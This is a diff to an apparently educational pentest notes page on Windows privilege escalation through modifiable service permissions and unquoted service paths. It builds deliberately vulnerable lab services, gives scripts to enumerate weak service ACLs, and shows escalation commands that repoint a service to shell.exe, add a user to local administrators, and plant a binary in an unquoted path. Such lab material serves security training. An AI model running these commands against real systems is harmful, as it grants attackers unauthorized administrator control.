@@ -456,7 +456,7 @@ icacls <binary location>
 
 <figure><img src="../../.gitbook/assets/image (1912).png" alt=""><figcaption></figcaption></figure>
 
-#### Using Custom PowerShell Script to identify Weak Service ACL
+#### Using Custom PowerShell Script to identify Weak Service Binary ACL
 
 {% code overflow="wrap" expandable="true" %}
 ```ps1
@@ -562,4 +562,607 @@ foreach ($service in $services) {
 <figure><img src="../../.gitbook/assets/image (1914).png" alt=""><figcaption></figcaption></figure>
 
 ### Abusing Modifiable Services&#x20;
+
+<details>
+
+<summary><strong>Create the Vulnerable Environment</strong> </summary>
+
+## Create Directories&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+New-Item -ItemType Directory -Path "C:\Program Files\AppTelemetry" -Force
+New-Item -ItemType Directory -Path "C:\ProgramData\AppTelemetry" -Force
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1922).png" alt=""><figcaption></figcaption></figure>
+
+## Build the service binaries&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+$source = @"
+using System;
+using System.ServiceProcess;
+using System.IO;
+using System.Threading;
+
+public class AppTelemetryAgent : ServiceBase
+{
+    private Thread worker;
+    private bool running = true;
+
+    public AppTelemetryAgent()
+    {
+        this.ServiceName = "AppTelemetryAgent";
+    }
+
+    protected override void OnStart(string[] args)
+    {
+        Directory.CreateDirectory(@"C:\ProgramData\AppTelemetry");
+
+        File.AppendAllText(
+            @"C:\ProgramData\AppTelemetry\agent.log",
+            DateTime.Now + " - Application Telemetry Agent started as " +
+            Environment.UserName + Environment.NewLine
+        );
+
+        worker = new Thread(Work);
+        worker.Start();
+    }
+
+    private void Work()
+    {
+        while (running)
+        {
+            File.AppendAllText(
+                @"C:\ProgramData\AppTelemetry\agent.log",
+                DateTime.Now + " - Telemetry collection cycle completed." +
+                Environment.NewLine
+            );
+
+            Thread.Sleep(10000);
+        }
+    }
+
+    protected override void OnStop()
+    {
+        running = false;
+
+        File.AppendAllText(
+            @"C:\ProgramData\AppTelemetry\agent.log",
+            DateTime.Now + " - Application Telemetry Agent stopped." +
+            Environment.NewLine
+        );
+    }
+
+    public static void Main()
+    {
+        ServiceBase.Run(new AppTelemetryAgent());
+    }
+}
+"@
+
+Add-Type `
+    -TypeDefinition $source `
+    -Language CSharp `
+    -OutputAssembly "C:\Program Files\AppTelemetry\AppTelemetryAgent.exe" `
+    -OutputType ConsoleApplication `
+    -ReferencedAssemblies "System.ServiceProcess.dll"
+```
+{% endcode %}
+
+## Verify the binary is not writable&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+icacls "C:\Program Files\AppTelemetry\AppTelemetryAgent.exe"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1923).png" alt=""><figcaption></figcaption></figure>
+
+## Create the service&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+sc.exe create AppTelemetryAgent binPath= "C:\Program Files\AppTelemetry\AppTelemetryAgent.exe" start= auto DisplayName= "Application Telemetry Agent"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1924).png" alt=""><figcaption></figcaption></figure>
+
+## Make it vulnerable&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+$sid = (Get-LocalUser -Name "esc_priv_user").SID.Value; sc.exe sdset AppTelemetryAgent "D:(A;;CCLCSWRPWPDTLOCRRC;;;${sid})(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1925).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+#### Manual Weak Service ACL Discovery&#x20;
+
+1. **Enumerate all services**&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+wmic service get name,displayname,pathname,startname
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1921).png" alt=""><figcaption></figcaption></figure>
+
+2. **Use** [**`accesschk.exe`**](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) **from sysinternals tools to identify ACL.**&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+accesschk.exe /accepteula -quvcw WindscribeService
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1920).png" alt=""><figcaption></figcaption></figure>
+
+#### Using custom PowerShell script to identify Weak Services ACL
+
+{% code overflow="wrap" expandable="true" %}
+```ps1
+# Find-ModifiableServices.ps1
+# Identify services where the current user/groups have
+# SERVICE_CHANGE_CONFIG, SERVICE_START, or SERVICE_STOP.
+#
+# A service is reported ONLY when SERVICE_CHANGE_CONFIG (DC)
+# is present.
+
+$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
+
+# ------------------------------------------------------------
+# Current user + group memberships
+# ------------------------------------------------------------
+
+$identities = @(
+    $currentUser.Name
+
+    $currentUser.Groups | ForEach-Object {
+        try {
+            $_.Translate(
+                [System.Security.Principal.NTAccount]
+            ).Value
+        }
+        catch {}
+    }
+)
+
+Write-Host ""
+Write-Host "Current User : $($currentUser.Name)" -ForegroundColor Cyan
+Write-Host "Checking service ACLs..." -ForegroundColor Cyan
+Write-Host ""
+
+# ------------------------------------------------------------
+# Convert ONLY the three service rights we care about
+# ------------------------------------------------------------
+
+function Convert-ServiceRights {
+
+    param (
+        [string]$Rights
+    )
+
+    $ReadableRights = @()
+
+    # DC = SERVICE_CHANGE_CONFIG
+    if ($Rights -match 'DC') {
+        $ReadableRights += "SERVICE_CHANGE_CONFIG"
+    }
+
+    # RP = SERVICE_START
+    if ($Rights -match 'RP') {
+        $ReadableRights += "SERVICE_START"
+    }
+
+    # WP = SERVICE_STOP
+    if ($Rights -match 'WP') {
+        $ReadableRights += "SERVICE_STOP"
+    }
+
+    if ($ReadableRights.Count -eq 0) {
+        return "None"
+    }
+
+    return ($ReadableRights -join ", ")
+}
+
+# ------------------------------------------------------------
+# Enumerate services
+# ------------------------------------------------------------
+
+$services = Get-CimInstance Win32_Service
+
+foreach ($service in $services) {
+
+    # --------------------------------------------------------
+    # Get service security descriptor
+    # --------------------------------------------------------
+
+    $sd = sc.exe sdshow $service.Name 2>$null
+
+    if (-not $sd) {
+        continue
+    }
+
+    $sdText = ($sd -join " ")
+
+    # --------------------------------------------------------
+    # Extract ACEs
+    # --------------------------------------------------------
+
+    $aces = [regex]::Matches(
+        $sdText,
+        '\(([^)]+)\)'
+    )
+
+    $interesting = @()
+
+    foreach ($aceMatch in $aces) {
+
+        $ace = $aceMatch.Groups[1].Value
+
+        # ACE:
+        # Type;Flags;Rights;ObjectGuid;InheritObjectGuid;AccountSid
+
+        $parts = $ace.Split(';')
+
+        if ($parts.Count -lt 6) {
+            continue
+        }
+
+        $aceType = $parts[0]
+        $rights  = $parts[2]
+        $sid     = $parts[5]
+
+        # ----------------------------------------------------
+        # Only Allow ACEs
+        # ----------------------------------------------------
+
+        if ($aceType -ne "A") {
+            continue
+        }
+
+        # ----------------------------------------------------
+        # Resolve SID -> Account
+        # ----------------------------------------------------
+
+        try {
+            $account = (
+                New-Object System.Security.Principal.SecurityIdentifier($sid)
+            ).Translate(
+                [System.Security.Principal.NTAccount]
+            ).Value
+        }
+        catch {
+            continue
+        }
+
+        # ----------------------------------------------------
+        # Check current user/groups
+        # ----------------------------------------------------
+
+        if ($identities -notcontains $account) {
+            continue
+        }
+
+        # ----------------------------------------------------
+        # IMPORTANT:
+        # Only DC makes the service interesting.
+        #
+        # RP/WP are displayed if they exist,
+        # but are NOT enough to report the service.
+        # ----------------------------------------------------
+
+        if ($rights -match 'DC') {
+
+            $interesting += [PSCustomObject]@{
+                Identity = $account
+                Rights   = Convert-ServiceRights $rights
+            }
+        }
+    }
+
+    # --------------------------------------------------------
+    # Display service
+    # --------------------------------------------------------
+
+    if ($interesting.Count -gt 0) {
+
+        Write-Host "============================================" `
+            -ForegroundColor Yellow
+
+        Write-Host "SERVICE : $($service.Name)" `
+            -ForegroundColor Green
+
+        Write-Host "DISPLAY : $($service.DisplayName)"
+        Write-Host "STATE   : $($service.State)"
+        Write-Host "RUN AS  : $($service.StartName)"
+        Write-Host "BINARY  : $($service.PathName)"
+        Write-Host ""
+
+        Write-Host "Relevant Service Rights:" `
+            -ForegroundColor Cyan
+
+        $interesting |
+            Select-Object Identity, Rights |
+            Format-Table -AutoSize
+
+        Write-Host ""
+    }
+}
+
+Write-Host "Finished." -ForegroundColor Cyan
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1919).png" alt=""><figcaption></figcaption></figure>
+
+#### Escalating Privileges&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+sc.exe config AppTelemetryAgent binpath="C:\Users\esc_priv_user\Desktop\shell.exe"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1918).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+_Note that if exe is not allowed to execute or there is some firewall restrictions for connections we can make ourself admin using this command:_&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+sc config WindscribeService binpath="cmd /c net localgroup administrators esc_priv_user /add"
+```
+{% endcode %}
+{% endhint %}
+
+### Unquoted Service Paths&#x20;
+
+#### How Windows resolves an unquoted command line
+
+Suppose a program is launched with:
+
+```
+C:\Program Files\Microsoft Office\Office16\WINWORD.EXE
+```
+
+Windows doesn't simply assume the whole string is the executable. Because there are spaces, it has to determine **which part is the executable name**.
+
+Conceptually, it tests possible executable boundaries from **left to right**:
+
+```
+1. C:\Program.exe
+2. C:\Program Files\Microsoft.exe
+3. C:\Program Files\Microsoft Office\Office16\WINWORD.exe
+```
+
+It checks whether each candidate actually exists/is executable. **It uses the first valid executable interpretation.**
+
+So if only:
+
+```
+C:\Program Files\Microsoft Office\Office16\WINWORD.exe
+```
+
+exists, that's what gets executed.
+
+<details>
+
+<summary><strong>Create the vulnerable environment</strong></summary>
+
+## Create Directories&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+New-Item -ItemType Directory -Path "C:\Program Files\DeviceTelemetry\Telemetry Agent" -Force
+New-Item -ItemType Directory -Path "C:\ProgramData\DeviceTelemetry" -Force
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1926).png" alt=""><figcaption></figcaption></figure>
+
+## Create legitimate Service Binary&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+$source = @"
+using System;
+using System.IO;
+using System.ServiceProcess;
+using System.Threading;
+
+public class DeviceHealthMonitor : ServiceBase
+{
+    private Thread worker;
+    private bool running = true;
+
+    public DeviceHealthMonitor()
+    {
+        this.ServiceName = "DeviceTelemetryAgent";
+    }
+
+    protected override void OnStart(string[] args)
+    {
+        Directory.CreateDirectory(@"C:\ProgramData\DeviceTelemetry");
+
+        File.AppendAllText(
+            @"C:\ProgramData\DeviceTelemetry\telemetry.log",
+            DateTime.Now +
+            " - Device Telemetry Agent started as " +
+            Environment.UserName +
+            Environment.NewLine
+        );
+
+        worker = new Thread(CollectTelemetry);
+        worker.Start();
+    }
+
+    private void CollectTelemetry()
+    {
+        while (running)
+        {
+            File.AppendAllText(
+                @"C:\ProgramData\DeviceTelemetry\telemetry.log",
+                DateTime.Now +
+                " - Device health telemetry collected." +
+                Environment.NewLine
+            );
+
+            Thread.Sleep(10000);
+        }
+    }
+
+    protected override void OnStop()
+    {
+        running = false;
+
+        File.AppendAllText(
+            @"C:\ProgramData\DeviceTelemetry\telemetry.log",
+            DateTime.Now +
+            " - Device Telemetry Agent stopped." +
+            Environment.NewLine
+        );
+    }
+
+    public static void Main()
+    {
+        ServiceBase.Run(new DeviceHealthMonitor());
+    }
+}
+"@
+
+Add-Type `
+    -TypeDefinition $source `
+    -Language CSharp `
+    -OutputAssembly "C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe" `
+    -OutputType ConsoleApplication `
+    -ReferencedAssemblies "System.ServiceProcess.dll"
+```
+{% endcode %}
+
+## Create the service with the unquoted path&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+sc.exe create DeviceTelemetryAgent type= own start= auto binpath= "C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe" obj= LocalSystem displayname= "Device Telemetry Agent"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1928).png" alt=""><figcaption></figcaption></figure>
+
+## Give Modify access to the parent directory&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+icacls "C:\Program Files\DeviceTelemetry" /grant:r "BAKASURA\esc_priv_user:(M)"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1932).png" alt=""><figcaption></figcaption></figure>
+
+## Give Normal User start/stop access&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+$sid = (Get-LocalUser -Name "esc_priv_user").SID.Value
+sc.exe sdset DeviceTelemetryAgent "D:(A;;CCLCRPWP;;;${sid})(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1933).png" alt=""><figcaption></figcaption></figure>
+
+
+
+</details>
+
+#### Searching for Unquoted Service paths&#x20;
+
+{% tabs %}
+{% tab title="CMD" %}
+{% code overflow="wrap" expandable="true" %}
+```powershell
+wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1934).png" alt=""><figcaption></figcaption></figure>
+{% endtab %}
+
+{% tab title="PowerShell" %}
+{% code overflow="wrap" expandable="true" %}
+```powershell
+Get-CimInstance Win32_Service |
+    Where-Object {
+        $_.StartMode -eq "Auto" -and
+        $_.PathName -notmatch '(?i)^"?C:\\Windows\\'
+    } |
+    Select-Object Name, DisplayName, PathName, StartMode
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1930).png" alt=""><figcaption></figcaption></figure>
+{% endtab %}
+{% endtabs %}
+
+#### Check which service has system access&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+sc.exe qc DeviceTelemetryAgent
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1935).png" alt=""><figcaption></figcaption></figure>
+
+#### Understand the candidate we're targeting&#x20;
+
+For:
+
+```
+C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe
+```
+
+the ambiguous candidates include:
+
+```
+C:\Program.exe
+C:\Program Files\DeviceTelemetry.exe
+C:\Program Files\DeviceTelemetry\Telemetry.exe
+C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe
+```
+
+{% hint style="info" %}
+_**Write permission on any of the above paths can help us escalate privileges.**_
+{% endhint %}
+
+#### Check Which candidate is writable&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```powershell
+accesschk.exe /accepteula -uwdq <directory>
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1936).png" alt=""><figcaption></figcaption></figure>
+
+#### Escalate Privileges&#x20;
+
+{% code overflow="wrap" expandable="true" %}
+```cmd
+cp C:\users\esc_priv_user\Desktop\shell.exe 'C:\Program Files\DeviceTelemetry\Telemetry.exe'
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (1937).png" alt=""><figcaption></figcaption></figure>
 
